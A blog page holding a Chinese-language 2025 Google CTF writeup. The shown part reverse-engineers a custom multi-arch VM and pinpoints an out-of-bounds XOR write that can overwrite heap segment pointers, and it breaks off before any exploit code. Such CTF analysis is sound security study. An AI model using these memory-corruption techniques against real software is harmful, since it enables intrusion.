@@ -1,0 +1,756 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"copy success(*^▽^*)","fail":"copy failed (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"Naup"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    2025 Google CTF - writeup |
+    
+    堇姬 Naup&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="GoogleCTF 2025 - writeup Author: 堇姬 Naup       Pwnmulti-arch 2一題 VM pwn第一題是 Reverse 第二題是 pwn這份 writeup 只有寫 pwn analyze IDA沒有 debug symbol，所以要修這台 VM 自定義了一個 masm 的檔案格式整個 masm 檔案格式就是  4 bytes MASM 作為 mag">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025 Google CTF - writeup">
+<meta property="og:url" content="http://example.com/2025/07/05/2025-Google-CTF-writeup/index.html">
+<meta property="og:site_name" content="堇姬 Naup&#39;s Blog">
+<meta property="og:description" content="GoogleCTF 2025 - writeup Author: 堇姬 Naup       Pwnmulti-arch 2一題 VM pwn第一題是 Reverse 第二題是 pwn這份 writeup 只有寫 pwn analyze IDA沒有 debug symbol，所以要修這台 VM 自定義了一個 masm 的檔案格式整個 masm 檔案格式就是  4 bytes MASM 作為 mag">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2025/07/05/2025-Google-CTF-writeup/a.png">
+<meta property="og:image" content="http://example.com/2025/07/05/2025-Google-CTF-writeup/b.png">
+<meta property="og:image" content="http://example.com/2025/07/05/2025-Google-CTF-writeup/c.png">
+<meta property="og:image" content="http://example.com/2025/07/05/2025-Google-CTF-writeup/d.png">
+<meta property="article:published_time" content="2025-07-05T10:59:48.000Z">
+<meta property="article:modified_time" content="2025-07-05T11:06:37.500Z">
+<meta property="article:author" content="Naup堇姬">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/07/05/2025-Google-CTF-writeup/a.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="堇姬 Naup's Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/fav.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">Naup...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">Home</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">Archives</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">About</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img fetchpriority="high" src="/images/posts_cover/googlectf/googlectf.png" alt="2025 Google CTF - writeup">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">2025 Google CTF - writeup</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GoogleCTF-2025-writeup"><span class="toc-number">1.</span> <span class="toc-text">GoogleCTF 2025 - writeup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">2.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#multi-arch-2"><span class="toc-number">2.1.</span> <span class="toc-text">multi-arch 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#analyze-IDA"><span class="toc-number">2.1.1.</span> <span class="toc-text">analyze IDA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#analyze-bug"><span class="toc-number">2.1.2.</span> <span class="toc-text">analyze bug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit"><span class="toc-number">2.1.3.</span> <span class="toc-text">exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#FishMaze"><span class="toc-number">3.1.</span> <span class="toc-text">FishMaze</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-1"><span class="toc-number">3.1.1.</span> <span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#after-all"><span class="toc-number">3.2.</span> <span class="toc-text">after all</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">74</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">21</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-2025-Google-CTF-writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/07/05/2025-Google-CTF-writeup/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-07-05T10:59:48.000Z" itemprop="datePublished">2025-07-05</time>
+    <time style="display: none;" id="post-update-time">2025-07-05</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="GoogleCTF-2025-writeup"><a href="#GoogleCTF-2025-writeup" class="headerlink" title="GoogleCTF 2025 - writeup"></a>GoogleCTF 2025 - writeup</h1><blockquote>
+<p>Author: 堇姬 Naup</p>
+</blockquote>
+<img src="/2025/07/05/2025-Google-CTF-writeup/a.png" class="">
+
+<img src="/2025/07/05/2025-Google-CTF-writeup/b.png" class="">
+
+
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="multi-arch-2"><a href="#multi-arch-2" class="headerlink" title="multi-arch 2"></a>multi-arch 2</h2><p>一題 VM pwn<br>第一題是 Reverse 第二題是 pwn<br>這份 writeup 只有寫 pwn</p>
+<h3 id="analyze-IDA"><a href="#analyze-IDA" class="headerlink" title="analyze IDA"></a>analyze IDA</h3><p>沒有 debug symbol，所以要修<br>這台 VM 自定義了一個 masm 的檔案格式<br>整個 masm 檔案格式就是</p>
+<ul>
+<li>4 bytes MASM 作為 magic number</li>
+<li>被 load 進去後共有 3 個 segments，code、data、stack</li>
+<li>檔案 header 有三段，分別是 code、data、arch_table</li>
+<li>每段的 header 有一個 offset 跟 size (2 bytes)</li>
+<li>最後面就是放那三段了</li>
+</ul>
+<p>整個 vm 的核心是這個結構體</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((<span class="title">packed</span>)) <span class="title">masm_struct</span> // <span class="title">sizeof</span>=</span><span class="number">0x88</span></span><br><span class="line"><span class="number">00000000</span> &#123;</span><br><span class="line"><span class="number">00000000</span>     <span class="type">void</span> *seg0;</span><br><span class="line"><span class="number">00000008</span>     <span class="type">void</span> *seg1;</span><br><span class="line"><span class="number">00000010</span>     <span class="type">void</span> *seg2;</span><br><span class="line"><span class="number">00000018</span>     <span class="type">void</span> *arch;</span><br><span class="line"><span class="number">00000020</span>     <span class="type">uint64_t</span> seg2_size;</span><br><span class="line"><span class="number">00000028</span>     <span class="type">void</span> (*get_flag)();</span><br><span class="line"><span class="number">00000030</span>     <span class="type">char</span> error_flag;</span><br><span class="line"><span class="number">00000031</span>     <span class="type">char</span> whether_can_run_unknow_syscall;</span><br><span class="line"><span class="number">00000032</span>     <span class="type">char</span> cmp_flag;</span><br><span class="line"><span class="number">00000033</span>     <span class="type">uint32_t</span> pc;</span><br><span class="line"><span class="number">00000037</span>     <span class="type">uint32_t</span> sp;</span><br><span class="line"><span class="number">0000003B</span>     <span class="type">uint32_t</span> registers[<span class="number">4</span>];</span><br><span class="line"><span class="number">0000004B</span>     HeapSegment heap_array_5[<span class="number">5</span>];</span><br><span class="line"><span class="number">00000087</span>     <span class="type">unsigned</span> __int8 heap_cnt;</span><br><span class="line"><span class="number">00000088</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((<span class="title">packed</span>)) <span class="title">HeapSegment</span> // <span class="title">sizeof</span>=</span><span class="number">0xC</span></span><br><span class="line"><span class="number">00000000</span> &#123;                                       <span class="comment">// XREF: masm_struct/r</span></span><br><span class="line"><span class="number">00000000</span>     <span class="type">void</span> *chunk_ptr_calloc;</span><br><span class="line"><span class="number">00000008</span>     <span class="type">int</span> vm_addr;</span><br><span class="line"><span class="number">0000000</span>C &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>提供了四個 register、sp、pc 等<br>另外也有 heap，這部分會在之後利用使用到，到時候深入說明</p>
+<p>正如題目名稱，這是一個 multi-arch 的 VM<br>共有兩個指令集架構<br>一個是基於 stack、另一個是 register</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">run_masm</span><span class="params">(__int64 masm)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 arch; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  arch = caculate_arch(masm);</span><br><span class="line">  <span class="keyword">if</span> ( !arch )</span><br><span class="line">    <span class="keyword">return</span> arch1(masm);</span><br><span class="line">  <span class="keyword">if</span> ( arch == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> arch2(masm);</span><br><span class="line">  fwrite(<span class="string">&quot;[E] nice qubit\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0xF</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他會去 parse 你的 arch-table 來去識別目前的 opcode 是哪個架構的<br>parse 的方法就是 arch-table 1 bytes 就是對應8個 pc<br>以 bits 為單位，0 代表 stack arch、1 代表 register arch</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int8 __fastcall <span class="title function_">caculate_arch</span><span class="params">(masm_struct *masm_struct)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint32_t</span> pc; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  pc = masm_struct-&gt;pc;</span><br><span class="line">  v2 = pc - <span class="number">0xFF9</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)(pc - <span class="number">0x1000</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    v2 = masm_struct-&gt;pc - <span class="number">0x1000</span>;</span><br><span class="line">  v3 = *((<span class="type">unsigned</span> __int8 *)masm_struct-&gt;arch + (v2 &gt;&gt; <span class="number">3</span>));<span class="comment">// 1 bytes == 8 pc</span></span><br><span class="line">  <span class="keyword">return</span> _bittest(&amp;v3, pc &amp; <span class="number">7</span>);                 <span class="comment">// which bits</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>指令集的部分就不細說<br>不過我只有逆乾淨 stack-arch 跟一部分的 register-arch<br>我把我有用到的貼出來</p>
+<p>stack-arch</p>
+<ul>
+<li>0x10 push imm (byte)</li>
+<li>0x30 push imm (dword)</li>
+<li>0xA0 syscall<ul>
+<li>syscall_num &#x3D; </li>
+<li>0 readint I; push I</li>
+<li>1 not supported</li>
+<li>2 pop s,n; fwrite(stdout,s,n)</li>
+<li>3 pop seed; srand(seed)</li>
+<li>4 push rand() + rand() &lt;&lt; 16</li>
+<li>5 call get_flag</li>
+<li>6 calloc heap</li>
+</ul>
+<p>	</p>
+</li>
+<li>0xff halt</li>
+</ul>
+<p>register-arch</p>
+<ul>
+<li>0x1 syscall syscall_num &#x3D; register[0]<ul>
+<li>0 readint reg[1]</li>
+<li>1 fread(stdin,[reg[2]],reg[3]) (terminate by newline)</li>
+<li>2 fwrite(stdout,[reg[2]],reg[3])</li>
+<li>3 srand(reg[2])</li>
+<li>4 reg[1] &#x3D; rand() + rand() &lt;&lt; 16</li>
+<li>5 no support</li>
+<li>6 calloc heap</li>
+</ul>
+<p>	</p>
+</li>
+<li>0x15 pop reg[0]</li>
+<li>0x16 pop reg[1]</li>
+<li>0x17 pop reg[2]</li>
+<li>0x41 xor idx(2 bytes), imm(4 bytes) (xor regs[idx], imm)</li>
+</ul>
+<h3 id="analyze-bug"><a href="#analyze-bug" class="headerlink" title="analyze bug"></a>analyze bug</h3><p>bug 是出在 register-arch xor 的地方</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x41</span>u:</span><br><span class="line">  v18 = masm-&gt;pc;</span><br><span class="line">  masm-&gt;pc = v18 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)read_char(masm, v18, &amp;v27) &amp;&amp; (ret = read_4bytes(masm, masm-&gt;pc, &amp;imm), (_BYTE)ret) )</span><br><span class="line">  &#123;</span><br><span class="line">    masm-&gt;pc += <span class="number">4</span>;</span><br><span class="line">    v19 = ((<span class="type">unsigned</span> __int8)v27 &gt;&gt; <span class="number">4</span>) - <span class="number">1</span> + <span class="number">12LL</span>;</span><br><span class="line">    *(_DWORD *)((<span class="type">char</span> *)&amp;masm-&gt;seg1 + <span class="number">4</span> * v19 + <span class="number">3</span>) ^= imm;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    masm-&gt;error_flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br></pre></td></tr></table></figure>
+
+<p>稍微寫個腳本去測試一下輸入，就可以發現，有很明顯的越界</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">idx</span>):</span><br><span class="line">    kk = (idx&gt;&gt;<span class="number">4</span>)-<span class="number">1</span>+<span class="number">12</span></span><br><span class="line">    a = <span class="number">0x8</span> + <span class="number">4</span>*kk + <span class="number">3</span></span><br><span class="line">    <span class="built_in">print</span>(idx,<span class="built_in">hex</span>(a))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0xff</span>):</span><br><span class="line">    f(i)</span><br></pre></td></tr></table></figure>
+
+<p>原本應該要只能寫到 register 的範圍<br>現在可以向下越界到 heap 的地方<br>這邊來看 heap 的實作方式吧<br>可以通過 syscall 6 來去創建 heap 區段</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">calloc_0x200_heap_seg</span><span class="params">(masm_struct *masm, <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 heap_cnt; <span class="comment">// r12</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> vm_addr; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">void</span> *chunk_pointer; <span class="comment">// rax</span></span><br><span class="line">  __int64 idx; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  heap_cnt = masm-&gt;heap_cnt;</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( heap_cnt != <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    vm_addr = a2 &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (a2 &amp; <span class="number">0xFFFFF000</span>) == <span class="number">0</span> )</span><br><span class="line">      vm_addr = <span class="number">0xA000</span>;</span><br><span class="line">    <span class="keyword">while</span> ( vm_addr_to_real_addr(masm, vm_addr, <span class="number">1LL</span>) )</span><br><span class="line">      vm_addr += <span class="number">0x1000</span>;</span><br><span class="line">    masm-&gt;heap_cnt = heap_cnt + <span class="number">1</span>;</span><br><span class="line">    chunk_pointer = <span class="built_in">calloc</span>(<span class="number">0x200</span>uLL, <span class="number">1uLL</span>);</span><br><span class="line">    idx = heap_cnt;</span><br><span class="line">    masm-&gt;heap_array_5[idx].chunk_ptr_calloc = chunk_pointer;</span><br><span class="line">    masm-&gt;heap_array_5[idx].vm_addr = vm_addr;</span><br><span class="line">    *a3 = vm_addr;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>總之會從 0xA000 開始，並且需要去對齊 0x1000<br>有空閒的記憶體後，他就會去 calloc 一塊 0x200 大小的 chunk<br>並把該 pointer 跟 vm 內的 address 都存到 heap_array 中<br>這段是可以被覆蓋到的<br>之後當想要去寫這塊記憶體的時候，他在 vm address 轉 實際的 address 時，就會去查這個 heap array</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">mapping_addr</span><span class="params">(masm_struct *masm, <span class="type">unsigned</span> <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 heap_cnt; <span class="comment">// di</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> *p_vm_addr; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0xFFF</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  v4 = a3 + a2;</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt;= <span class="number">0x1FFF</span> )</span><br><span class="line">    <span class="keyword">return</span> (__int64)masm-&gt;seg0 + a2 - <span class="number">4096</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0x1FFF</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt;= <span class="number">0x2FFF</span> )</span><br><span class="line">    <span class="keyword">return</span> (__int64)masm-&gt;seg1 + a2 - <span class="number">0x2000</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x7FFF</span> &amp;&amp; v4 &lt;= <span class="number">0x8FFF</span> )</span><br><span class="line">    <span class="keyword">return</span> (__int64)masm-&gt;seg2 + a2 - <span class="number">0x8000</span>;</span><br><span class="line">LABEL_7:</span><br><span class="line">  heap_cnt = masm-&gt;heap_cnt;</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( heap_cnt )</span><br><span class="line">  &#123;</span><br><span class="line">    p_vm_addr = &amp;masm-&gt;heap_array_5[<span class="number">0</span>].vm_addr;</span><br><span class="line">    v8 = a3 + a2;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = *p_vm_addr;</span><br><span class="line">      <span class="keyword">if</span> ( a2 &gt;= *p_vm_addr &amp;&amp; v8 &lt; (<span class="type">unsigned</span> <span class="type">int</span>)(v9 + <span class="number">512</span>) )</span><br><span class="line">        <span class="keyword">return</span> (__int64)masm-&gt;heap_array_5[(<span 